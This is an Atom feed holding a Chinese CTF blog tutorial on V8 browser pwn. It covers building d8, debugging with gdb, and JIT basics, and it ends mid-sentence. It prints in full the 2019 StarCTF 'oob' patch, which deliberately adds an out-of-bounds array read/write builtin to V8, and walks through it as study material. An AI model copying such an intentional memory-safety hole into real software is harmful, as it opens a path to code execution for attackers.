<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>iyheart的博客</title>
  
  <subtitle>分享笔记和学习历程</subtitle>
  <link href="http://iyheart.github.io/atom.xml" rel="self"/>
  
  <link href="http://iyheart.github.io/"/>
  <updated>2025-02-25T12:26:13.220Z</updated>
  <id>http://iyheart.github.io/</id>
  
  <author>
    <name>iyheart</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Chrome-v8-入门</title>
    <link href="http://iyheart.github.io/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/"/>
    <id>http://iyheart.github.io/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/</id>
    <published>2025-02-25T12:15:28.000Z</published>
    <updated>2025-02-25T12:26:13.220Z</updated>
    
    <content type="html"><![CDATA[<ul><li>学习一下<code>Chrome-v8</code>，堆打累了，顺便给新生赛出一题简单的<code>chrome-v8</code>的<code>pwn</code>题</li><li>参考博客：<a href="https://a1ex.online/2021/09/17/Chorme-v8-%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/">Chorme-v8-入门学习 | A1ex’s Blog</a></li><li>参考博客：<a href="https://hornos3.github.io/2024/12/01/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-1/">chrome v8 pwn 学习 (1) | CoLin’s BLOG</a></li><li>参考博客：<a href="https://zmx2321.github.io/vite-blog/pages/note/front/v8-note/v8-note-9.html#%E4%BD%BF%E7%94%A8-d8-%E8%BF%9B%E8%A1%8C%E8%B0%83%E8%AF%95">如何构建和使用V8的调试工具d8 | zmx的前端日志</a></li><li>参考博客：<a href="https://www.freebuf.com/vuls/203721.html">从一道CTF题零基础学V8漏洞利用 - FreeBuf网络安全行业门户</a></li></ul><h1 id="浏览器相关知识"><a class="markdownIt-Anchor" href="#浏览器相关知识"></a> 浏览器相关知识</h1><ul><li><code>Chrome-v8</code>的<code>pwn</code>属于浏览器的<code>pwn</code>。接下来对浏览器做一个比较系统比较全面的了解</li><li><code>Chrome</code>就是我们经常说的<strong>谷歌浏览器</strong>，本质上是一个网页浏览器，该浏览器是由谷歌公司开发的。而<code>Chrome</code>里面的<code>JavaScript</code><strong>解释器</strong>被称为<code>v8</code>，一开始主要做的pwn题就是面向<code>v8</code>。</li><li>接下来介绍一下主流的<code>JS</code>引擎。</li></ul><table><thead><tr><th>引擎</th><th>开发者</th><th>主要应用</th><th>编译方式</th><th>备注</th></tr></thead><tbody><tr><td>V8</td><td>Google</td><td>Chrome、Node.js</td><td>JIT（TurboFan + lgnition）</td><td>速度快，广泛用于服务器端</td></tr><tr><td>SpiderMonkey</td><td>Mozilla</td><td>Firefox</td><td>JIT（IonMonkey）</td><td>早期JS引擎，支持WebAssembly</td></tr><tr><td>JavaScriptCore（JSC）</td><td>Apple</td><td>Safari、WebKit</td><td>JIT（Nitro）</td><td>适用于macOS/iOS</td></tr><tr><td>Chakra</td><td>Microsoft</td><td>旧版Edge、IE</td><td>JIT</td><td>Edge现已经改用V8</td></tr><tr><td>Hermes</td><td>Meta</td><td>React Native</td><td>AOT</td><td>专注移动端优化</td></tr><tr><td>QuickJS</td><td>Fabrice Bellard</td><td>嵌入式设备</td><td>解释执行（无 JIT）</td><td>轻量级，支持ES2020</td></tr></tbody></table><ul><li>而解释器这个的实现也就是使用<strong>底层语言</strong>去解释执行另一种语言，在这里是使用<code>C++</code>语言来解释<code>JavaScript</code>语言</li></ul><h1 id="环境搭建"><a class="markdownIt-Anchor" href="#环境搭建"></a> 环境搭建</h1><h2 id="编译最新版本"><a class="markdownIt-Anchor" href="#编译最新版本"></a> 编译最新版本</h2><ul><li><p>（注：如果是在打比赛现学就请看编译之前版本）</p></li><li><p>这边需要手动编译源码，<code>chrome</code>里面的<code>JavaScript</code>解释器被称为v8</p></li><li><p>我们先要下载一个源码，这个源码被称为<code>v8</code>，而<code>v8</code>经过编译后的文件被称为<code>d8</code>。根据编译的可选项，可以编译出<code>debug</code>版本或者<code>release</code>版本，一般两个版本都编译出来</p></li><li><p>还需要下载两个编译<code>v8</code>源码的工具<code>depot_tools</code>、<code>ninja</code></p><ul><li><code>depot_tools</code>：是用来得到<code>v8</code>源码（也就是使用这个工具去下载<code>v8</code>源码，而不是直接使用<code>git</code>去拉取源码）</li><li><code>ninja</code>：用来编译<code>v8</code></li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ninja-build/ninja.git</span><br></pre></td></tr></table></figure><ul><li>然后将这两个工具添加进环境变量，将<code>depot_tools</code>添加环境变量（注意添加环境变量的时候需要使用绝对路径）</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=$PATH:&quot;/home/myheart/CTF/pwn/chrome_v8_pwn/depot_tools&quot;&#x27;</span> &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure><ul><li>将<code>ninja</code>添加环境变量：在添加ninja为环境变量之前先要使用<code>./configure.py</code>编译<code>ninja</code></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ninja</span><br><span class="line">./configure.py --bootstrap</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=$PATH:&quot;/home/myheart/CTF/pwn/chrome_v8_pwn/ninja&quot;&#x27;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure><ul><li>接下来就是使用<code>depot_tools</code>去下载源码</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fetch v8</span><br><span class="line"><span class="built_in">cd</span> v8</span><br></pre></td></tr></table></figure><ul><li>然后准备依赖和编译<code>v8</code><ul><li><code>gclient sync</code>:<code>v8</code>项目的所有依赖项（注意旧版的源码可能会出现Python版本问题）</li><li><code>tools/dev/v8gen.py x64.debug</code>：传递给<code>v8gen.py</code>一个参数，表示生成<code>x64</code>架构生成的<code>调试版本</code></li><li><code>ninja -C out.gn/x64.debug   </code>：编译项目</li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gclient <span class="built_in">sync</span></span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug    </span><br></pre></td></tr></table></figure><p><strong>注意</strong>：在<code>gclient sync</code>命令执行的时候可能会出现代理问题，执行成功后会在这个文件中生成文件。</p><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250214200010144.png" alt="image-20250214200010144"></p><p><strong>注意</strong>：在<code>ninja -C out.gn/x64.debug </code>这个命令就是开始编译了，编译时间比较久，很吃CPU</p><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250214202103840.png" alt="image-20250214202103840"></p><h2 id="回退版本与加载补丁"><a class="markdownIt-Anchor" href="#回退版本与加载补丁"></a> 回退版本与加载补丁</h2><ul><li>在打比赛的时候，需要对相应的版本进行调试，这就导致了我们需要编译指定的版本。在比赛中我们得到的<code>v8</code>不一定是最新版本，我们之前编译的版本是<code>V8 version 13.5.0 </code>，假如我们比赛的时候<code>v8</code>的版本为<code>v8 version 13.3</code>版本，这时我们就要回退版本。</li><li>我们现在已经使用<code>fetch v8</code>，将远程的<code>v8</code>源码版本为<code>v8 version 13.5.0</code>给拉取到本地了。</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250218145114643.png" alt="image-20250218145114643"></p><ul><li>如果我们修改了这个源码，我们就可以使用<code>git diff &gt; my_changes.diff</code>，就会生成一个<code>my_changes.diff</code>文件，这个文件之后有用。</li><li>如果我们想要回退到指定的<code>v8</code>版本，这时就需要输入如下命令，用于查看<code>v8</code>的版本：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git tag</span><br></pre></td></tr></table></figure><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250218145510100.png" alt="image-20250218145510100"></p><ul><li>要切换版本就需要输入如下命令：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git checkout tags/10.0.1 -b v8-10.0.1</span><br><span class="line">//也就是git checkout tags/指定版本 -b v8-指定版本</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="动态调试"><a class="markdownIt-Anchor" href="#动态调试"></a> 动态调试</h1><ul><li><p><code>js</code>有两种动态调试的方式</p><ul><li>第一种使用的是<code>d8</code>内部的<code>API</code>调试，但是调试并没有调试到<code>寄存器</code>、<code>内存</code>这么底层。</li><li>第二种就是使用<code>d8</code>配合<code>gdb</code>进行调试，这种调试就会涉及到<code>寄存器</code>和<code>内存</code></li></ul></li><li><p>对于第一种方式，具体介绍一下<code>V8</code>内部的<code>API</code>：</p></li></ul><table><thead><tr><th>API</th><th>作用</th></tr></thead><tbody><tr><td>console.log(%HasFastProperties({}));</td><td>检查对象是否使用 Fast Properties</td></tr><tr><td>console.log(%GetOptimizationStatus(foo));</td><td>获取 <code>foo</code> 函数的优化状态</td></tr><tr><td>console.log(%HasInlinedFunctionCode(bar));</td><td>查看 <code>bar</code> 是否被内联</td></tr><tr><td>%CollectGarbage();</td><td>触发垃圾回收</td></tr><tr><td>console.log(%GetHiddenClass(obj));</td><td>获取对象的隐藏类信息</td></tr></tbody></table><h2 id="d8调试"><a class="markdownIt-Anchor" href="#d8调试"></a> d8调试</h2><ul><li>我们先创建一个<code>test.js</code>文件</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params">property_num,element_num</span>) &#123;</span><br><span class="line">  <span class="comment">//添加可索引属性</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; element_num; i++) &#123;</span><br><span class="line">      <span class="variable language_">this</span>[i] = <span class="string">`element<span class="subst">$&#123;i&#125;</span>`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//添加常规属性</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; property_num; i++) &#123;</span><br><span class="line">      <span class="keyword">let</span> ppt = <span class="string">`property<span class="subst">$&#123;i&#125;</span>`</span></span><br><span class="line">      <span class="variable language_">this</span>[ppt] = ppt</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> bar = <span class="keyword">new</span> <span class="title class_">Foo</span>(<span class="number">10</span>,<span class="number">10</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(%<span class="title class_">HasFastProperties</span>(bar));</span><br><span class="line"><span class="keyword">delete</span> bar.<span class="property">property2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(%<span class="title class_">HasFastProperties</span>(bar));</span><br></pre></td></tr></table></figure><ul><li>然后使用<code>d8 test.js --allow-natives-syntax</code>即可进行调试，使用<code>--allow-natives-syntax</code>就可以调用<code>V8</code>的<code>API</code>，这样就可以输出一些调试信息，这样就可以输出调试信息。</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250215004347798.png" alt="image-20250215004347798"></p><ul><li>还可以这样进行调试，类似于交互式<code>Shell</code>效果调试。先输入命令<code>../v8/out.gn/x64.debug/d8  --allow-natives-syntax </code></li><li>这样我们就可以进入<code>d8</code>的交互式界面</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250215004504171.png" alt="image-20250215004504171"></p><ul><li>然后我们就可以进行一边编写代码一边调试</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250215004650130.png" alt="image-20250215004650130"></p><h2 id="gdb调试"><a class="markdownIt-Anchor" href="#gdb调试"></a> gdb调试</h2><ul><li>我们先创建一个<code>test.js</code>文件</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">var</span> username = <span class="string">&quot;iwen&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> age = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">var</span> people_zhangsan = <span class="string">&quot;张三&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(age);</span><br></pre></td></tr></table></figure><ul><li>使用<code>gdb</code>调试，就要进行如下操作</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb ../v8/out.gn/x64.debug/d8</span><br></pre></td></tr></table></figure><ul><li>然后在<code>gdb</code>的内部输入命令，就可以调试了</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> args --allow-natives-syntax test2.js</span><br></pre></td></tr></table></figure><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250215005354891.png" alt="image-20250215005354891"></p><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250215005454750.png" alt="image-20250215005454750"></p><ul><li>在<code>v8</code>源码中就可以<code>v8</code>自带的调试<code>JS</code>代码的gdb插件，我们先进入<code>/path/to/v8/tools目录</code>，然后在这个目录下可以找到<code>gdbinit</code>文件，这样就可以使用如下命令：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> gdbinit ~/.gdbinit_v8</span><br></pre></td></tr></table></figure><ul><li>之后编辑<code>~/.gdbinit</code>，添加如下文件：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.gdbinit_v8</span><br></pre></td></tr></table></figure><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250218143830509.png" alt="image-20250218143830509"></p><ul><li>这样我们调试的时候就会出现对应的源码</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250218144212624.png" alt="image-20250218144212624"></p><ul><li>这里也介绍一下<code>~/.gdbinit_v8</code>中的一些调试命令<ul><li><code>job</code>命令：用于可视化显示<code>JavaScript</code>对象的内存结构。</li><li><code>telescope</code>命令：查看内存数据</li></ul></li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250218151701532.png" alt="image-20250218151701532"></p><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250218151743753.png" alt="image-20250218151743753"></p><h1 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h1><h2 id="jit编译初步了解"><a class="markdownIt-Anchor" href="#jit编译初步了解"></a> JIT编译初步了解</h2><ul><li><p>这里先介绍一下一些基础知识。<code>Chrome V8</code>目前演变成如下解释过程：</p></li><li><p>当我们编写一个<code>JS</code>代码，使用<code>V8</code>去执行这个<code>JS</code>代码：</p><ul><li>首先我们会通过<code>解析器</code>将<code>V8</code>的<code>JS</code>代码解析为抽象语法树。</li><li>然后会通过<code>解释器</code>对抽象语法树进行解释，将<code>JS</code>代码转换为字节码，一边解释一边执行，并且解释器会记录特定代码片段的运行次数</li><li>当运行次数超过某个阈值，该段代码就会被记为热代码，并且将运行时的信息反馈给<code>优化编译器</code></li><li><code>优化编译器</code>根据反馈信息，优化并编译字节码，生成优化后的机器码，这样再次执行这个代码的时候就会执行相应的机器码。</li></ul></li><li><p>上面的技术就被称为<code>JIT</code>（及时编译技术）</p><ul><li>其中<code>解析器</code>的源码在<code>v8/src/parsing</code></li><li>解释器的源码在<code>v8/src/interpreter</code></li><li>优化编译器源码在<code>v8/src/compiler</code>或者<code>v8/src/maglev</code></li></ul></li></ul><h2 id="js常用的类"><a class="markdownIt-Anchor" href="#js常用的类"></a> JS常用的类</h2><h3 id="数组array"><a class="markdownIt-Anchor" href="#数组array"></a> 数组Array</h3><h1 id="关于chrome-pwn的题型"><a class="markdownIt-Anchor" href="#关于chrome-pwn的题型"></a> 关于Chrome-pwn的题型</h1><ul><li><p><code>Chrome-pwn</code>题型有两种</p><ul><li><code>第一种</code>：一般就是对<code>v8</code>进行一些修改，人为制造出一个漏洞，然后给出<code>.diff</code>文件</li><li><code>第二种</code>：直接用<code>CVE</code>出题</li></ul></li><li><p>对于第二种就是看<code>CVE</code>漏洞在哪，或者一步一步去牢。接下来重点分析第一种题型</p></li><li><p>对于第一种题型，出题人先会对源码进行修改，然后编写<code>.diff</code>文件。而这个<code>.diff</code>文件，是github主要用于<strong>显示代码变更</strong>，是<strong>Git版本控制系统的一部分</strong>。所以给出<code>.diff</code>文件，我们就可以从<code>.diff</code>文件中看出<strong>出题人所修改的地方</strong>，从而发现并利用漏洞。接下来就以<code>2019StarCTF oob</code>这题给的<code>.diff</code>为例子，对<code>.diff</code>的一些进行分析</p></li><li><p>下面就是该题给的<code>.diff</code>文件，接下来逐句解释一下<code>.diff</code>文件的每行代码的意思</p><ul><li>前四行是<code>Git Diff</code>格式的头部信息，用于描述<strong>对比的文件</strong>和<strong>修改信息</strong><ul><li><code>diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</code>：这里就表明了对源码中<code>/src/bootstrapper.cc</code>这个文件做了修改<ul><li><code>diff --git</code>是Git生成的差异比较标识</li><li><code>a/src/bootstrapper.cc</code>是修改前的文件，其中<code>a/</code>表示修改前的文件。</li><li><code>b/src/bootstrapper.cc</code>是修改后的文件，<code>b/</code>表示修改后的文件</li></ul></li><li><code>index b027d36..ef1002f 100644</code>：表示哈希和文件权限模式，<code>b027d36</code>修改前的哈希、<code>ef1002f</code>修改后的哈希，<code>100644</code>文件权限模式。这里的哈希仅仅只是被修改文件修改前后的哈希</li><li>第三行和第四行<code>--- a/src/bootstrapper.cc</code>、<code>+++ b/src/bootstrapper.cc</code>，表示修改前和修改后的文件路径</li></ul></li><li><code>@@ -1668,6 +1668,8 @@</code>表示改文件改动的地方：表示改动的位置和行号，从这边我们就可以得知对源码修改了<code>2</code>行<ul><li>``-1668,6<code>：</code>-<code>表示旧代码，而</code>1668,6<code>表示</code>1668<code>行的位置往下</code>6`行；</li><li><code>+1668,8</code>：<code>-</code>表示新代码，而<code>1668,8</code>表示<code>1668</code>行的位置往下<code>8</code>行；</li></ul></li><li>之后的<code>@@ -1668,6 +1668,8 @@</code>之后从第<code>6</code>行到第<code>14</code>行就是展现修改后具体的代码，而有两行开头有<code>+</code>就表示是新添加的代码</li></ul></li><li><p>该<code>.diff</code>文件的剩余部分是对其它源码文件进行修改，就不做详细介绍了。</p></li></ul><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index b027d36..ef1002f 100644</span></span><br><span class="line"><span class="comment">--- a/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/bootstrapper.cc</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@@ -1668,6 +1668,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index 8df340e..9b828ab 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -361,6 +361,27 @@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index 0447230..f113a81 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -368,6 +368,7 @@</span> namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line"><span class="addition">+  CPP(ArrayOob)                                                                \</span></span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">index ed1e4a5..c199e3a 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/typer.cc</span></span><br><span class="line"><span class="meta">@@ -1680,6 +1680,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line"><span class="addition">+    case Builtins::kArrayOob:</span></span><br><span class="line"><span class="addition">+      return Type::Receiver();</span></span><br><span class="line"> </span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="魔改v8"><a class="markdownIt-Anchor" href="#魔改v8"></a> 魔改V8</h1><ul><li><p>参考这篇博客：<a href="https://hornos3.github.io/2024/12/01/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-1/">chrome v8 pwn 学习 (1) | CoLin’s 